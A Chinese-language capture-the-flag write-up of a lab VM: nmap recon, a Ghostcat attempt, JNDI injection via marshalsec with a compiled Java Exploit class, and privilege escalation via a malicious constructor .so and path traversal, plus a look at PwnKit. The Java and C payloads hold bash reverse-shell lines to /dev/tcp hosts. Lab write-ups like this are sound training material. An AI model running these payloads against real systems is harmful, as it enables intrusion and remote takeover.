## 信息收集
### nmap
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -A 192.168.56.132    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-27 06:37 EDT
Nmap scan report for 192.168.56.132
Host is up (0.0011s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.62 (Debian)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
|   Potentially risky methods: PUT DELETE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: \xE5\x88\xA9\xE5\x85\xB9\xE4\xB8\x8E\xE9\x9D\x92\xE9\xB8\x9F | \xE5\xB1\xB1\xE7\x94\xB0\xE5\xB0\x9A\xE5\xAD\x90\xE6\x89\xA7\xE5\xAF\xBC\xE7\x9A\x84\xE9\x9D\x92\xE6\x98\xA5\xE8\xAF\x97\xE7\xAF\x87
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-server-header: Apache-Coyote/1.1
MAC Address: 08:00:27:9C:B6:42 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.05 ms 192.168.56.132

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.94 seconds
-
```
发现AJP = Apache 和 Tomcat 之间的通信协议

### 查看页面
![image.png](https://gitee.com/fogpost/photo/raw/master/202603271859496.png)
![image.png](https://gitee.com/fogpost/photo/raw/master/202603271859483.png)

初步认为认为是Ghostcat (CVE-2020-1938)

## 攻击靶机
```bash
git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi.git
cd CNVD-2020-10487-Tomcat-Ajp-lfi
```

```bash
python3 tomcat-ajp-lfi.py ip -p 8009 -f WEB-INF/web.xml
```

发现连不上问了才知道是移位密码jndi.jsp
然后进入对应页面
![image.png](https://gitee.com/fogpost/photo/raw/master/202603272112518.png)
发现存在jndilookup漏洞，可以用nc回连
![image.png](https://gitee.com/fogpost/photo/raw/master/202603272123359.png)
找到并编译marshalsec
### 写Exploit.java
```java
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("bash -c 'bash -i >& /dev/tcp/你的IP/4444 0>&1'");
        } catch (Exception e) {}
    }
}
```
```java
#上面这个有点问题，下面这个可以回显
#java Runtime.getRuntime().exec() 
/* 不会解析 `'`、`>&`、管道这些 shell 语法 */
public class Exploit {
    static {
        try {
            String[] cmd = {
                "/bin/bash",
                "-c",
                "bash -i >& /dev/tcp/192.168.56.130/4444 0>&1"
            };
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {}
    }
}

```
准备Exploit.class，编译
```bash
javac Exploit.java
## message javax.servlet.ServletException: java.lang.UnsupportedClassVersionError: Exploit has been compiled by a more recent version of the Java Runtime (class file version 55.0), this version of the Java Runtime only recognizes class file versions up to 52.0
## 发现版本不对
javac -source 1.8 -target 1.8 Exploit.java
##查看把版本
javap -verbose Exploit.class | grep "major"
major version: 52
```
后台监听
```
nc -lvnp 4444
```
marshalsec调用
```
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \  
"http://192.168.56.130:8000/#Exploit"
```
页面jndi调用
```bash
ldap://192.168.56.130:1389/a
```
得到shell,拿到flag{ilikeyou,Nozomi}
![image.png](https://gitee.com/fogpost/photo/raw/master/202603272158717.png)

## 提权
查看/opt
```
/opt
├── file
├── java_agent_start.sh   ⭐重点
└── test.class
```
查看文件,认为是Java Agent 劫持（动态库加载）
```bash
file_name=/opt/file/tmp

file_line=$(awk 'NR==1 {print;exit}' "$file_name")
file_line=$(basename $file_line)

cd /opt

echo $file_line

/usr/local/java/.../bin/java -agentpath:/usr/local/java/.../$file_line test
```
查看tmp权限,发现可写，完美
```bash
ls -l /opt/file/tmp
-rw-r--rw- 1 root root 1 Mar 25 04:21 /opt/file/tmp
```
```bash
echo evil.so > /opt/file/tmp
```
编写c
```c
cat << 'EOF' > evil.c
#include <stdlib.h>
void __attribute__((constructor)) init() {
    system("bash -c 'bash -i >& /dev/tcp/192.168.56.130/5555 0>&1'");
}
EOF
```
```bash
gcc -shared -fPIC evil.c -o evil.so
mv evil.so /usr/local/java/jdk1.8.0_20/jre/lib/amd64/
```
发现没有权限
```bash
bluebird@JNDI:~$ mv evil.so /usr/local/java/jdk1.8.0_20/jre/lib/amd64/
mv evil.so /usr/local/java/jdk1.8.0_20/jre/lib/amd64/
mv: cannot move 'evil.so' to '/usr/local/java/jdk1.8.0_20/jre/lib/amd64/evil.so': Permission denied
```
传evil.so到tmp，尝试路径穿越，搞完才发现这个任务是用户权限没法提权
```
echo ../../../../tmp/evil.so > /opt/file/tmp
```
查看定时任务
```bash 
bluebird@JNDI:~/apache-tomcat-8.0.1$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
bluebird@JNDI:~/apache-tomcat-8.0.1$ ls -la /etc/cron*
ls -la /etc/cron*
-rw-r--r-- 1 root root 1042 Oct 11  2019 /etc/crontab

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 Apr  1  2025 .
drwxr-xr-x 82 root root 4096 Mar 27 10:25 ..
-rw-r--r--  1 root root  712 Mar  9  2025 php
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.daily:
total 36
drwxr-xr-x  2 root root 4096 Apr  1  2025 .
drwxr-xr-x 82 root root 4096 Mar 27 10:25 ..
-rwxr-xr-x  1 root root  539 Jul  1  2024 apache2
-rwxr-xr-x  1 root root 1478 Apr 19  2021 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 May 24  2022 dpkg
-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate
-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Mar 18  2025 .
drwxr-xr-x 82 root root 4096 Mar 27 10:25 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Mar 18  2025 .
drwxr-xr-x 82 root root 4096 Mar 27 10:25 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.weekly:
total 12
drwxr-xr-x  2 root root 4096 Mar 18  2025 .
drwxr-xr-x 82 root root 4096 Mar 27 10:25 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
```
看suid,发现/usr/bin/pkexec，认为是Polkit 提权，经典漏洞：PwnKit
CVE-2021-4034
```bash
bluebird@JNDI:~$ find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```
查看版本pkexec version 0.105<0.120

总结链条
- 信息收集（nmap）
- 发现 Tomcat + AJP
- Ghostcat 尝试（失败）
- 找到隐藏点 `ptjo.pyv`
- 解密 → `jndi.jsp`
- JNDI 注入 → RCE
- 拿 shell
- 升级 tty
- 枚举 → 发现 pkexec
- 利用 PwnKit → root
